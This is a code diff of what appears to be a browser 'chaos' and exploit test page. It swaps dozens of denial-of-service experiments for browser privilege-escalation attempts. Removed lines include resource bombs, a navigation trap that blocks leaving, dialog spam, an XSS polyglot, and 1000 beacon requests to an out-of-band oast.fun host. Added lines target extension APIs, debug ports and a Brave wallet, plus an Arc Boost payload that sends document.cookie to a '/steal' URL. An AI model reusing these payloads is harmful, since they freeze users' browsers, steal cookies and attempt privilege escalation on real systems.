-    // ============ EXPERIMENT 7: CANVAS GPU CHAOS ============
-    function exp14_webglMemoryOverflow() {
-        addChaosLog("🎮 WebGL memory overflow - GPU buffer chaos", 'exploit');
-        const canvas = document.createElement('canvas');
-        const gl = canvas.getContext('webgl2') || canvas.getContext('webgl');
-        if(gl) {
-            const massiveBuffer = new Float32Array(1024 * 1024 * 100);
-            const buffer = gl.createBuffer();
-            gl.bindBuffer(gl.ARRAY_BUFFER, buffer);
-            gl.bufferData(gl.ARRAY_BUFFER, massiveBuffer, gl.STATIC_DRAW);
-            addChaosLog("🎮 Massive GPU buffer allocated", 'success');
+        
+        addLog("📝 RCE Payload prepared", 'info');
+        addLog("⚠️ Requires CDP port open and --remote-debugging-port flag", 'error');
+        
+        // Cek apakah kita bisa akses chrome.devtools
+        if (typeof chrome !== 'undefined' && chrome.devtools) {
+            addLog("✅ chrome.devtools accessible! Potential RCE vector", 'rce');
         }
-        updateCounter();
+        
+        checkPrivilegedObjects();
     }
     
-    function exp15_canvasPixelChaos() {
-        addChaosLog("🎨 Canvas pixel manipulation chaos", 'chaos');
-        const canvas = document.createElement('canvas');
-        canvas.width = 10000;
-        canvas.height = 10000;
-        const ctx = canvas.getContext('2d');
-        for(let i = 0; i < 100000; i++) {
-            ctx.fillStyle = `hsl(${Math.random() * 360}, 100%, 50%)`;
-            ctx.fillRect(Math.random() * 10000, Math.random() * 10000, 100, 100);
-        }
-        addChaosLog("🎨 100k random rectangles drawn", 'success');
-        updateCounter();
-    }
-    
-    // ============ EXPERIMENT 8: WEBHOOK EXFILTRATION ============
-    function exp16_webhookBeaconSpam() {
-        addChaosLog("📡 Webhook beacon spam - 1000 requests", 'exploit');
-        const target = "hbmxxhjrwltzpspxeewy12akxn7vzgpu9.oast.fun";
-        for(let i = 0; i < 1000; i++) {
-            const img = new Image();
-            img.src = `http://${target}/beacon/${i}?data=${encodeURIComponent(JSON.stringify({i, time: Date.now()}))}`;
-        }
-        addChaosLog("📡 1000 beacon requests sent", 'success');
-        updateCounter();
-    }
-    
-    // ============ EXPERIMENT 9: KEYBOARD/MOUSE CHAOS ============
-    function exp17_keyboardEventFlood() {
-        addChaosLog("⌨️ Keyboard event flooding - UI freeze", 'chaos');
-        const win = window.open('', '_blank');
-        setInterval(() => {
-            win.dispatchEvent(new KeyboardEvent('keydown', {key: 'a', code: 'KeyA'}));
-            win.dispatchEvent(new KeyboardEvent('keyup', {key: 'a', code: 'KeyA'}));
-        }, 1);
-        updateCounter();
-    }
-    
-    // ============ EXPERIMENT 10: LOCALSTORAGE BOMB ============
-    function exp18_storageBomb() {
-        addChaosLog("💣 localStorage bomb - filling storage", 'exploit');
-        try {
-            const bomb = 'X'.repeat(1024 * 1024 * 5);
-            for(let i = 0; i < 100; i++) {
-                localStorage.setItem(`bomb_${i}`, bomb);
+    // EXPLOIT 2: Extension API
+    function exploitExtensionAPI() {
+        addLog("🧩 Attempting Chrome Extension API hijack...", 'info');
+        
+        if (typeof chrome !== 'undefined' && chrome.runtime) {
+            addLog("✅ chrome.runtime available!", 'rce');
+            
+            // Coba send message ke extension
+            try {
+                chrome.runtime.sendMessage({action: "ping", data: "test"}, (response) => {
+                    if (response) addLog("✅ Extension response received", 'success');
+                });
+            } catch(e) { addLog("❌ Cannot send message - may need extension context", 'error'); }
+            
+            // Coba get extension info
+            if (chrome.management) {
+                chrome.management.getSelf((info) => {
+                    addLog(`📦 Extension: ${info.name} - ${info.id}`, 'info');
+                });
             }
-            addChaosLog("💣 localStorage bomb deployed", 'success');
-        } catch(e) {
-            addChaosLog("Storage quota exceeded - bomb worked", 'success');
-        }
-        updateCounter();
-    }
-    
-    // ============ EXPERIMENT 11: CRYPTO CHAOS ============
-    function exp19_cryptoMining() {
-        addChaosLog("⛏️ Crypto mining simulation - CPU overload", 'chaos');
-        function mine() {
-            let hash = 0;
-            for(let i = 0; i < 100000000; i++) {
-                hash = ((hash << 5) - hash) + i;
-                hash |= 0;
-            }
-            requestAnimationFrame(mine);
-        }
-        for(let i = 0; i < 4; i++) {
-            setTimeout(mine, i * 100);
-        }
-        updateCounter();
-    }
-    
-    // ============ EXPERIMENT 12: NAVIGATION CHAOS ============
-    function exp20_navigationLoop() {
-        addChaosLog("🌀 Navigation infinite loop - trap", 'chaos');
-        const win = window.open('', '_blank');
-        win.document.write(`
-            <!DOCTYPE html>
-            <html>
-            <head>
-                <meta http-equiv="refresh" content="0">
-            </head>
-            <body>
-                <h1>🔥 NAVIGATION TRAP</h1>
-                <p>You can't escape</p>
-                <script>
-                    window.onbeforeunload = () => 'Cannot leave';
-                    setInterval(() => location.reload(), 100);
-                <\/script>
-            </body>
-            </html>
-        `);
-        updateCounter();
-    }
-    
-    // ============ EXPERIMENT 13: AUDIO CHAOS ============
-    function exp21_audioChaos() {
-        addChaosLog("🔊 Audio context flood - sound chaos", 'chaos');
-        const AudioContext = window.AudioContext || window.webkitAudioContext;
-        if(AudioContext) {
-            for(let i = 0; i < 10; i++) {
-                const ctx = new AudioContext();
-                const oscillator = ctx.createOscillator();
-                oscillator.connect(ctx.destination);
-                oscillator.start();
-                setTimeout(() => oscillator.stop(), 100);
-            }
-        }
-        updateCounter();
-    }
-    
-    // ============ EXPERIMENT 14: WEBWORKER ARMY ============
-    function exp22_workerArmy() {
-        addChaosLog("🧠 Web worker army - 100 workers", 'exploit');
-        const workers = [];
-        const workerCode = `self.onmessage = e => { while(true) { self.postMessage('ping'); } }`;
-        const blob = new Blob([workerCode], {type: 'application/javascript'});
-        const url = URL.createObjectURL(blob);
-        for(let i = 0; i < 100; i++) {
-            const w = new Worker(url);
-            w.postMessage('start');
-            workers.push(w);
-        }
-        addChaosLog("🧠 100 workers spawned", 'success');
-        updateCounter();
-    }
-    
-    // ============ EXPERIMENT 15: GEOLOCATION SPAM ============
-    function exp23_geolocationSpam() {
-        addChaosLog("📍 Geolocation request spam", 'chaos');
-        for(let i = 0; i < 100; i++) {
-            navigator.geolocation.getCurrentPosition(
-                pos => addChaosLog(`📍 Location: ${pos.coords.latitude}, ${pos.coords.longitude}`, 'info'),
-                err => {}
-            );
-        }
-        updateCounter();
-    }
-    
-    // ============ EXPERIMENT 16: NOTIFICATION BOMB ============
-    function exp24_notificationBomb() {
-        addChaosLog("🔔 Notification permission spam", 'chaos');
-        if(Notification.permission === 'granted') {
-            for(let i = 0; i < 100; i++) {
-                new Notification(`Alert ${i}`, {body: 'CHAOS MODE'});
-            }
+            
+            // Simulate injection ke extension context
+            addLog("💀 Jika extension vulnerable, bisa inject: chrome.runtime.sendMessage({action: 'execute', code: 'alert(1)'})", 'rce');
         } else {
-            Notification.requestPermission();
+            addLog("❌ No extension API access from web content", 'error');
+            addLog("💡 But if we find XSS in chrome://extensions, we could escape!", 'info');
         }
-        updateCounter();
+        
+        // Try to open extensions page
+        window.open('chrome://extensions', '_blank');
+        addLog("📂 Opened chrome://extensions - potential injection target", 'info');
     }
     
-    // ============ EXPERIMENT 17: DRAG AND DROP CHAOS ============
-    function exp25_dragChaos() {
-        addChaosLog("🖱️ Drag and drop event flood", 'chaos');
-        const win = window.open('', '_blank');
-        setInterval(() => {
-            const dragEvent = new DragEvent('drag', {clientX: Math.random() * 1000, clientY: Math.random() * 1000});
-            win.dispatchEvent(dragEvent);
-        }, 10);
-        updateCounter();
+    // EXPLOIT 3: about:debugging
+    function exploitAboutDebugging() {
+        addLog("🐛 Attempting about:debugging privilege escalation...", 'info');
+        
+        const win = window.open('about:debugging', '_blank');
+        setTimeout(() => {
+            addLog("📂 about:debugging opened - similar to Firefox's about:preferences", 'info');
+            addLog("💀 In Firefox, XSS here gave Components.stack access", 'rce');
+            
+            // Try to check for privileged objects
+            try {
+                const hasComponents = win?.Components !== undefined;
+                addLog(hasComponents ? "✅ Components object found! Privilege escalation possible!" : "❌ Components not found (patched)", hasComponents ? 'rce' : 'info');
+            } catch(e) {}
+        }, 1000);
     }
     
-    // ============ EXPERIMENT 18: CSS CHAOS ============
-    function exp26_cssChaos() {
-        addChaosLog("🎨 CSS keyframe explosion", 'chaos');
-        const style = document.createElement('style');
-        let css = '';
-        for(let i = 0; i < 1000; i++) {
-            css += `@keyframes chaos${i} {
-                0% { transform: translate(0,0); }
-                100% { transform: translate(${Math.random() * 1000}px, ${Math.random() * 1000}px); }
-            }
-            .chaos${i} { animation: chaos${i} 0.1s infinite; }`;
-        }
-        style.textContent = css;
-        document.head.appendChild(style);
-        const div = document.createElement('div');
-        div.style.position = 'fixed';
-        div.style.top = '0';
-        div.style.left = '0';
-        div.style.width = '100%';
-        div.style.height = '100%';
-        div.style.background = 'rgba(255,0,255,0.1)';
-        div.style.pointerEvents = 'none';
-        div.style.zIndex = '99999';
-        document.body.appendChild(div);
-        updateCounter();
+    // EXPLOIT 4: ARC Browser Boost
+    function exploitArcBoost() {
+        addLog("🌀 Attempting ARC Browser Boost injection...", 'info');
+        addLog("📚 Based on CVE-2024-45489 - Arc Boost RCE", 'info');
+        
+        const isArc = detectBrowser() === 'Arc';
+        if (isArc) addLog("✅ Arc browser detected!", 'success');
+        
+        // Simulate Boost injection
+        try {
+            // Arc stores boosts in localStorage
+            const boostData = {
+                name: "malicious_boost",
+                code: "alert('RCE from Boost!'); fetch('http://localhost:8080/steal?data='+btoa(document.cookie))",
+                matchPattern: "https://*"
+            };
+            
+            localStorage.setItem('arc-boost-pending', JSON.stringify(boostData));
+            addLog("💀 Boost payload prepared in localStorage", 'rce');
+            addLog("⚠️ If Arc sync feature is enabled, this could spread", 'warning');
+            
+        } catch(e) { addLog(`❌ Boost injection failed: ${e.message}`, 'error'); }
+        
+        checkPrivilegedObjects();
     }
     
-    // ============ EXPERIMENT 19: HISTORY API BREAK ============
-    function exp27_historyBreak() {
-        addChaosLog("📜 History API infinite push", 'chaos');
-        const win = window.open('', '_blank');
-        setInterval(() => {
-            for(let i = 0; i < 100; i++) {
-                win.history.pushState({}, '', `/#chaos${Math.random()}`);
-            }
-        }, 100);
-        updateCounter();
+    // EXPLOIT 5: Brave Wallet
+    function exploitBraveWallet() {
+        addLog("💰 Attempting Brave Wallet privilege escalation...", 'info');
+        
+        const isBrave = detectBrowser() === 'Brave';
+        if (isBrave) addLog("✅ Brave browser detected!", 'success');
+        
+        // Try to open wallet
+        window.open('brave://wallet', '_blank');
+        addLog("📂 Opened brave://wallet - potential XSS target", 'info');
+        
+        // Check for crypto objects
+        if (typeof web3 !== 'undefined') addLog("✅ web3 found - wallet accessible", 'rce');
+        if (typeof ethereum !== 'undefined') addLog("✅ ethereum provider found", 'rce');
+        
+        // Wallet injection payload
+        addLog("💀 Jika XSS di wallet: ethereum.request({method: 'eth_sendTransaction', params: [...]})", 'rce');
     }
     
-    // ============ EXPERIMENT 20: POSTMESSAGE FLOOD ============
-    function exp28_postMessageFlood() {
-        addChaosLog("📨 PostMessage cross-origin flood", 'exploit');
-        const win = window.open('', '_blank');
-        win.document.write('<h1>🔥 POSTMESSAGE FLOOD</h1><p>Receiving messages...</p>');
-        for(let i = 0; i < 1000; i++) {
-            win.postMessage({type: 'chaos', data: randomString(1000), index: i}, '*');
-        }
-        updateCounter();
+    // EXPLOIT 6: Safari Web Inspector
+    function exploitSafariInspector() {
+        addLog("🐚 Attempting Safari Web Inspector injection...", 'info');
+        
+        const isSafari = detectBrowser() === 'Safari';
+        if (isSafari) addLog("✅ Safari browser detected!", 'success');
+        
+        // Cek debug port
+        fetch('http://localhost:9222/json').catch(() => {});
+        addLog("🔍 Checking Safari debug ports (9222-9229)", 'info');
+        addLog("💀 If Safari Remote Debugging enabled, we can inject via CDP", 'rce');
+        
+        // Try to open Web Inspector via keyboard (simulate)
+        addLog("⌨️ Simulating Web Inspector open (Cmd+Option+I)", 'info');
+        
+        checkPrivilegedObjects();
     }
     
-    // ============ EXPERIMENT 21: VIEWPORT CHAOS ============
-    function exp29_viewportChaos() {
-        addChaosLog("📱 Viewport meta tag chaos", 'chaos');
-        const win = window.open('', '_blank');
-        win.document.write(`
+    // EXPLOIT 7: Edge PDF
+    function exploitEdgePDF() {
+        addLog("📄 Attempting Edge PDF Viewer escape...", 'info');
+        
+        const isEdge = detectBrowser() === 'Edge';
+        if (isEdge) addLog("✅ Edge browser detected!", 'success');
+        
+        // Create malicious PDF-like content
+        const maliciousHTML = `
             <!DOCTYPE html>
             <html>
-            <head>
-                <meta name="viewport" content="width=device-width, initial-scale=100, maximum-scale=100, user-scalable=yes">
-                <meta name="viewport" content="width=10, initial-scale=0.001">
-            </head>
             <body>
-                <h1>🔥 VIEWPORT CHAOS</h1>
-                <p>Zoom level insane</p>
+                <embed type="application/pdf" src="data:application/pdf,${btoa('%PDF-1.4 malicious content')}">
+                <script>alert('PDF XSS - Edge escape attempt');<\/script>
             </body>
             </html>
-        `);
-        updateCounter();
-    }
-    
-    // ============ EXPERIMENT 22: PRINT CHAOS ============
-    function exp30_printChaos() {
-        addChaosLog("🖨️ Print dialog spam", 'chaos');
-        setInterval(() => {
-            window.print();
-        }, 100);
-        updateCounter();
-    }
-    
-    // ============ EXPERIMENT 23: CLIPBOARD CHAOS ============
-    function exp31_clipboardChaos() {
-        addChaosLog("📋 Clipboard write flood", 'exploit');
-        setInterval(async () => {
-            try {
-                await navigator.clipboard.writeText(randomString(10000));
-            } catch(e) {}
-        }, 10);
-        updateCounter();
-    }
-    
-    // ============ EXPERIMENT 24: BATTERY CHAOS ============
-    function exp32_batteryChaos() {
-        addChaosLog("🔋 Battery API polling", 'chaos');
-        if('getBattery' in navigator) {
-            navigator.getBattery().then(battery => {
-                setInterval(() => {
-                    addChaosLog(`🔋 Battery: ${battery.level * 100}%, charging: ${battery.charging}`, 'info');
-                }, 100);
-            });
-        }
-        updateCounter();
-    }
-    
-    // ============ EXPERIMENT 25: BLUETOOTH CHAOS ============
-    function exp33_bluetoothChaos() {
-        addChaosLog("📶 Bluetooth scan spam", 'exploit');
-        if('bluetooth' in navigator) {
-            for(let i = 0; i < 10; i++) {
-                navigator.bluetooth.requestDevice({acceptAllDevices: true}).catch(() => {});
-            }
-        }
-        updateCounter();
-    }
-    
-    // ============ EXPERIMENT 26: USB CHAOS ============
-    function exp34_usbChaos() {
-        addChaosLog("🔌 USB device request spam", 'exploit');
-        if('usb' in navigator) {
-            for(let i = 0; i < 10; i++) {
-                navigator.usb.requestDevice({filters: []}).catch(() => {});
-            }
-        }
-        updateCounter();
-    }
-    
-    // ============ EXPERIMENT 27: MIDI CHAOS ============
-    function exp35_midiChaos() {
-        addChaosLog("🎹 MIDI access spam", 'exploit');
-        if('requestMIDIAccess' in navigator) {
-            for(let i = 0; i < 10; i++) {
-                navigator.requestMIDIAccess().catch(() => {});
-            }
-        }
-        updateCounter();
-    }
-    
-    // ============ EXPERIMENT 28: VIBRATION CHAOS ============
-    function exp36_vibrationChaos() {
-        addChaosLog("📳 Vibration pattern spam", 'chaos');
-        if('vibrate' in navigator) {
-            setInterval(() => {
-                navigator.vibrate([100, 100, 100, 100, 100, 100]);
-            }, 500);
-        }
-        updateCounter();
-    }
-    
-    // ============ EXPERIMENT 29: SCREEN WAKE LOCK ============
-    function exp37_wakeLockSpam() {
-        addChaosLog("💤 Wake lock request spam", 'exploit');
-        if('wakeLock' in navigator) {
-            setInterval(async () => {
-                try {
-                    await navigator.wakeLock.request('screen');
-                } catch(e) {}
-            }, 100);
-        }
-        updateCounter();
-    }
-    
-    // ============ EXPERIMENT 30: SHARED ARRAY BUFFER ============
-    function exp38_sharedArrayBufferChaos() {
-        addChaosLog("🔗 SharedArrayBuffer cross-origin exploit", 'exploit');
-        try {
-            const sab = new SharedArrayBuffer(1024 * 1024 * 100);
-            const view = new Uint8Array(sab);
-            for(let i = 0; i < view.length; i++) {
-                view[i] = i % 256;
-            }
-            addChaosLog("🔗 Large SharedArrayBuffer created", 'success');
-        } catch(e) {}
-        updateCounter();
-    }
-    
-    // ============ EXPERIMENT 31: ATOMIC OPERATIONS ============
-    function exp39_atomicChaos() {
-        addChaosLog("⚛️ Atomic operations flood", 'chaos');
-        try {
-            const sab = new SharedArrayBuffer(1024);
-            const view = new Int32Array(sab);
-            for(let i = 0; i < 100000; i++) {
-                Atomics.add(view, 0, 1);
-                Atomics.sub(view, 0, 1);
-                Atomics.and(view, 0, 0xFF);
-                Atomics.or(view, 0, 0x00);
-            }
-            addChaosLog("⚛️ 100k atomic operations", 'success');
-        } catch(e) {}
-        updateCounter();
-    }
-    
-    // ============ EXPERIMENT 32: WEBASSEMBLY CHAOS ============
-    function exp40_wasmChaos() {
-        addChaosLog("🦀 WebAssembly compilation spam", 'exploit');
-        const wasmCode = new Uint8Array([0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00]);
-        for(let i = 0; i < 100; i++) {
-            WebAssembly.compile(wasmCode).catch(() => {});
-        }
-        addChaosLog("🦀 100 WASM compilations", 'success');
-        updateCounter();
-    }
-    
-    // ============ EXPERIMENT 33: INTERSECTION OBSERVER ============
-    function exp41_intersectionChaos() {
-        addChaosLog("👁️ IntersectionObserver spam", 'chaos');
-        const elements = [];
-        for(let i = 0; i < 1000; i++) {
-            const div = document.createElement('div');
-            div.style.height = '100px';
-            div.style.width = '100px';
-            div.style.position = 'absolute';
-            div.style.top = `${Math.random() * 10000}px`;
-            div.style.left = `${Math.random() * 10000}px`;
-            document.body.appendChild(div);
-            elements.push(div);
-        }
-        const observer = new IntersectionObserver(() => {});
-        elements.forEach(el => observer.observe(el));
-        addChaosLog("👁️ 1000 elements observed", 'success');
-        updateCounter();
-    }
-    
-    // ============ EXPERIMENT 34: RESIZE OBSERVER ============
-    function exp42_resizeChaos() {
-        addChaosLog("📏 ResizeObserver spam", 'chaos');
-        const observer = new ResizeObserver(() => {});
-        for(let i = 0; i < 1000; i++) {
-            const div = document.createElement('div');
-            document.body.appendChild(div);
-            observer.observe(div);
-        }
-        updateCounter();
-    }
-    
-    // ============ EXPERIMENT 35: MUTATION OBSERVER ============
-    function exp43_mutationChaos() {
-        addChaosLog("🧬 MutationObserver flood", 'chaos');
-        const observer = new MutationObserver(() => {});
-        observer.observe(document.body, {attributes: true, childList: true, subtree: true, characterData: true});
-        for(let i = 0; i < 10000; i++) {
-            const div = document.createElement('div');
-            div.setAttribute('data-test', randomString(100));
-            document.body.appendChild(div);
-            div.remove();
-        }
-        updateCounter();
-    }
-    
-    // ============ EXPERIMENT 36: PERFORMANCE MARK ============
-    function exp44_performanceChaos() {
-        addChaosLog("⏱️ Performance mark spam", 'chaos');
-        for(let i = 0; i < 100000; i++) {
-            performance.mark(`mark_${i}`);
-            performance.measure(`measure_${i}`, `mark_${i}`);
-        }
-        addChaosLog("⏱️ 100k performance marks", 'success');
-        updateCounter();
-    }
-    
-    // ============ EXPERIMENT 37: RESOURCE TIMING ============
-    function exp45_resourceTimingFlood() {
-        addChaosLog("📊 Resource timing flood", 'chaos');
-        for(let i = 0; i < 1000; i++) {
-            const img = new Image();
-            img.src = `https://dummyimage.com/1x1/${Math.random().toString(16).substr(2,6)}/fff.png?t=${i}`;
-        }
-        updateCounter();
-    }
-    
-    // ============ EXPERIMENT 38: SESSION STORAGE ============
-    function exp46_sessionStorageBomb() {
-        addChaosLog("💾 Session storage bomb", 'exploit');
-        try {
-            for(let i = 0; i < 1000; i++) {
-                sessionStorage.setItem(`bomb_${i}`, 'X'.repeat(1024 * 100));
-            }
-        } catch(e) {}
-        updateCounter();
-    }
-    
-    // ============ EXPERIMENT 39: INDEXEDDB CHAOS ============
-    function exp47_indexedDBChaos() {
-        addChaosLog("🗄️ IndexedDB chaos", 'exploit');
-        const request = indexedDB.open('chaosDB', 1);
-        request.onupgradeneeded = (e) => {
-            const db = e.target.result;
-            for(let i = 0; i < 100; i++) {
-                const store = db.createObjectStore(`store_${i}`, {autoIncrement: true});
-                for(let j = 0; j < 1000; j++) {
-                    store.add({data: randomString(10000)});
-                }
-            }
-        };
-        updateCounter();
-    }
-    
-    // ============ EXPERIMENT 40: COOKIE MONSTER ============
-    function exp48_cookieMonster() {
-        addChaosLog("🍪 Cookie bomb - thousands of cookies", 'exploit');
-        for(let i = 0; i < 1000; i++) {
-            document.cookie = `cookie_${i}=${randomString(100)}; path=/`;
-        }
-        addChaosLog("🍪 1000 cookies set", 'success');
-        updateCounter();
-    }
-    
-    // ============ EXPERIMENT 41: CORS CHAOS ============
-    function exp49_corsChaos() {
-        addChaosLog("🌐 CORS preflight spam", 'exploit');
-        for(let i = 0; i < 100; i++) {
-            fetch('https://cors-test.codehappy.dev/' + i, {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json', 'X-Custom-Header': randomString(1000)}
-            }).catch(() => {});
-        }
-        updateCounter();
-    }
-    
-    // ============ EXPERIMENT 42: WEBSOCKET ARMY ============
-    function exp50_websocketArmy() {
-        addChaosLog("🔌 WebSocket connection army", 'exploit');
-        for(let i = 0; i < 100; i++) {
-            const ws = new WebSocket(`wss://echo.websocket.org/${i}`);
-            ws.onopen = () => ws.send('CHAOS');
-            setTimeout(() => ws.close(), 100);
-        }
-        updateCounter();
-    }
-    
-    // ============ EXPERIMENT 43: EVENT SOURCE ============
-    function exp51_eventSourceChaos() {
-        addChaosLog("📡 EventSource connections", 'exploit');
-        for(let i = 0; i < 50; i++) {
-            const es = new EventSource(`https://sse.dev/test/${i}`);
-            setTimeout(() => es.close(), 100);
-        }
-        updateCounter();
-    }
-    
-    // ============ EXPERIMENT 44: DIALOG SPAM ============
-    function exp52_dialogChaos() {
-        addChaosLog("💬 Dialog spam - alert/confirm/prompt", 'chaos');
-        setInterval(() => {
-            setTimeout(() => alert('CHAOS'), 0);
-            setTimeout(() => confirm('CHAOS?'), 0);
-            setTimeout(() => prompt('CHAOS:'), 0);
-        }, 100);
-        updateCounter();
-    }
-    
-    // ============ EXPERIMENT 45: PRINTF CHAOS ============
-    function exp53_consoleChaos() {
-        addChaosLog("📝 Console method flood", 'chaos');
-        setInterval(() => {
-            console.log(randomString(1000));
-            console.warn(randomString(1000));
-            console.error(randomString(1000));
-            console.info(randomString(1000));
-            console.debug(randomString(1000));
-            console.table([{a:1,b:2,c:3}]);
-            console.trace();
-            console.time('chaos');
-            console.timeEnd('chaos');
-            console.group('chaos');
-            console.groupEnd();
-            console.assert(false, randomString(100));
-            console.count();
-            console.clear();
-        }, 10);
-        updateCounter();
-    }
-    
-    // ============ EXPERIMENT 46: XSS POLYGLOT ============
-    function exp54_xssPolyglot() {
-        addChaosLog("🔮 XSS polyglot injection", 'exploit');
-        const polyglot = 'javascript:/*--></title></style></textarea></script></xmp><svg/onload=alert(1)><svg/onload=alert(2)>';
-        const win = window.open(`javascript:document.write('<h1>XSS POLYGLOT</h1><p>${polyglot}</p>')`, '_blank');
-        updateCounter();
-    }
-    
-    // ============ EXPERIMENT 47: TEMPLATE LITERAL ============
-    function exp55_templateChaos() {
-        addChaosLog("📄 Template literal injection", 'exploit');
-        const inject = '${alert(1)}';
-        const template = `Hello ${inject}`;
-        const win = window.open('', '_blank');
-        win.document.write(`<h1>Template Literal Test</h1><p>${template}</p>`);
-        updateCounter();
-    }
-    
-    // ============ EXPERIMENT 48: EVAL CHAOS ============
-    function exp56_evalChaos() {
-        addChaosLog("⚡ eval() chaos - code injection", 'exploit');
-        for(let i = 0; i < 100; i++) {
-            try {
-                eval(`function chaos_${i}() { return ${i} + ${i} * ${Math.random()}; } chaos_${i}();`);
-            } catch(e) {}
-        }
-        updateCounter();
-    }
-    
-    // ============ EXPERIMENT 49: FUNCTION CONSTRUCTOR ============
-    function exp57_functionConstructorChaos() {
-        addChaosLog("🔨 Function constructor abuse", 'exploit');
-        for(let i = 0; i < 100; i++) {
-            const fn = new Function('return ' + i + '+' + i + '*Math.random()');
-            fn();
-        }
-        updateCounter();
-    }
-    
-    // ============ EXPERIMENT 50: WITH STATEMENT ============
-    function exp58_withChaos() {
-        addChaosLog("📦 'with' statement chaos", 'chaos');
-        const obj = {a:1, b:2, c:3, d:4, e:5};
-        with(obj) {
-            for(let i = 0; i < 10000; i++) {
-                const result = a + b + c + d + e;
-            }
-        }
-        updateCounter();
-    }
-    
-    // ============ EXPERIMENT 51: PROXY OBJECT ============
-    function exp59_proxyChaos() {
-        addChaosLog("🎭 Proxy object interception", 'exploit');
-        const target = {};
-        const handler = {
-            get: (obj, prop) => {
-                addChaosLog(`🎭 Proxy get: ${String(prop)}`, 'info');
-                return prop in obj ? obj[prop] : 'hacked';
-            },
-            set: (obj, prop, value) => {
-                addChaosLog(`🎭 Proxy set: ${String(prop)} = ${value}`, 'info');
-                obj[prop] = value;
-                return true;
-            }
-        };
-        const proxy = new Proxy(target, handler);
-        proxy.test = 'value';
-        const val = proxy.test;
-        updateCounter();
-    }
-    
-    // ============ EXPERIMENT 52: REFLECT API ============
-    function exp60_reflectChaos() {
-        addChaosLog("🔮 Reflect API abuse", 'exploit');
-        const obj = {};
-        for(let i = 0; i < 10000; i++) {
-            Reflect.set(obj, `prop_${i}`, i);
-            Reflect.get(obj, `prop_${i}`);
-            Reflect.has(obj, `prop_${i}`);
-            Reflect.ownKeys(obj);
-        }
-        updateCounter();
-    }
-    
-    // ============ EXPERIMENT 53: SYMBOL CHAOS ============
-    function exp61_symbolChaos() {
-        addChaosLog("✨ Symbol generation spam", 'chaos');
-        const symbols = [];
-        for(let i = 0; i < 10000; i++) {
-            symbols.push(Symbol(`chaos_${i}`));
-            symbols.push(Symbol.for(`global_${i}`));
-        }
-        addChaosLog(`✨ ${symbols.length} symbols created`, 'success');
-        updateCounter();
-    }
-    
-    // ============ EXPERIMENT 54: ITERATOR CHAOS ============
-    function exp62_iteratorChaos() {
-        addChaosLog("🔄 Infinite iterator", 'chaos');
-        function* infiniteGenerator() {
-            let i = 0;
-            while(true) {
-                yield i++;
-            }
-        }
-        const gen = infiniteGenerator();
-        for(let i = 0; i < 100000; i++) {
-            gen.next();
-        }
-        updateCounter();
-    }
-    
-    // ============ EXPERIMENT 55: PROMISE CHAOS ============
-    function exp63_promiseChaos() {
-        addChaosLog("🤝 Promise.allSettled flood", 'exploit');
-        const promises = [];
-        for(let i = 0; i < 1000; i++) {
-            promises.push(new Promise((resolve, reject) => {
-                setTimeout(() => Math.random() > 0.5 ? resolve(i) : reject(i), Math.random() * 100);
-            }));
-        }
-        Promise.allSettled(promises).then(() => addChaosLog("🤝 1000 promises settled", 'success'));
-        updateCounter();
-    }
-    
-    // ============ EXPERIMENT 56: ASYNC/AWAIT CHAOS ============
-    async function exp64_asyncChaos() {
-        addChaosLog("⏳ Async/await recursion", 'chaos');
-        async function chaosRecursion(depth) {
-            if(depth > 1000) return;
-            await new Promise(r => setTimeout(r, 1));
-            return chaosRecursion(depth + 1);
-        }
-        chaosRecursion(0);
-        updateCounter();
-    }
-    
-    // ============ EXPERIMENT 57: FETCH CHAIN ============
-    function exp65_fetchChain() {
-        addChaosLog("🔗 Fetch promise chain", 'exploit');
-        let promise = Promise.resolve();
-        for(let i = 0; i < 1000; i++) {
-            promise = promise.then(() => fetch(`https://httpbin.org/delay/0.1?i=${i}`).catch(() => {}));
-        }
-        updateCounter();
-    }
-    
-    // ============ EXPERIMENT 58: URL CHAOS ============
-    function exp66_urlChaos() {
-        addChaosLog("🔗 URLSearchParams flood", 'chaos');
-        const params = new URLSearchParams();
-        for(let i = 0; i < 10000; i++) {
-            params.append(`param_${i}`, randomString(100));
-        }
-        addChaosLog(`🔗 ${params.size} URL parameters`, 'success');
-        updateCounter();
-    }
-    
-    // ============ EXPERIMENT 59: BLOB CHAOS ============
-    function exp67_blobChaos() {
-        addChaosLog("📦 Blob URL generation", 'exploit');
-        const blobs = [];
-        for(let i = 0; i < 1000; i++) {
-            const blob = new Blob([randomString(100000)], {type: 'text/plain'});
-            const url = URL.createObjectURL(blob);
-            blobs.push({blob, url});
-        }
-        addChaosLog(`📦 1000 blobs created`, 'success');
-        setTimeout(() => {
-            blobs.forEach(({url}) => URL.revokeObjectURL(url));
-        }, 5000);
-        updateCounter();
-    }
-    
-    // ============ EXPERIMENT 60: FILE READER ============
-    function exp68_fileReaderChaos() {
-        addChaosLog("📁 FileReader spam", 'exploit');
-        const blob = new Blob([randomString(1000000)], {type: 'text/plain'});
-        for(let i = 0; i < 100; i++) {
-            const reader = new FileReader();
-            reader.readAsText(blob);
-        }
-        updateCounter();
-    }
-    
-    // ============ EXPERIMENT 61: FORM DATA ============
-    function exp69_formDataChaos() {
-        addChaosLog("📝 FormData construction", 'exploit');
-        const fd = new FormData();
-        for(let i = 0; i < 10000; i++) {
-            fd.append(`field_${i}`, randomString(100));
-        }
-        addChaosLog(`📝 ${Array.from(fd.keys()).length} form fields`, 'success');
-        updateCounter();
-    }
-    
-    // ============ EXPERIMENT 62: HEADERS CHAOS ============
-    function exp70_headersChaos() {
-        addChaosLog("📋 Headers object flood", 'exploit');
-        const headers = new Headers();
-        for(let i = 0; i < 10000; i++) {
-            headers.set(`X-Custom-${i}`, randomString(100));
-        }
-        updateCounter();
-    }
-    
-    // ============ EXPERIMENT 63: REQUEST CHAOS ============
-    function exp71_requestChaos() {
-        addChaosLog("📨 Request object flood", 'exploit');
-        for(let i = 0; i < 1000; i++) {
-            new Request('https://httpbin.org/post', {
-                method: 'POST',
-                headers: {'X-Test': randomString(1000)},
-                body: randomString(10000)
-            });
-        }
-        updateCounter();
-    }
-    
-    // ============ EXPERIMENT 64: RESPONSE CHAOS ============
-    function exp72_responseChaos() {
-        addChaosLog("📬 Response object flood", 'exploit');
-        for(let i = 0; i < 1000; i++) {
-            new Response(randomString(10000), {
-                status: 200 + (i % 100),
-                headers: {'X-Test': randomString(100)}
-            });
-        }
-        updateCounter();
-    }
-    
-    // ============ EXPERIMENT 65: STREAM CHAOS ============
-    function exp73_streamChaos() {
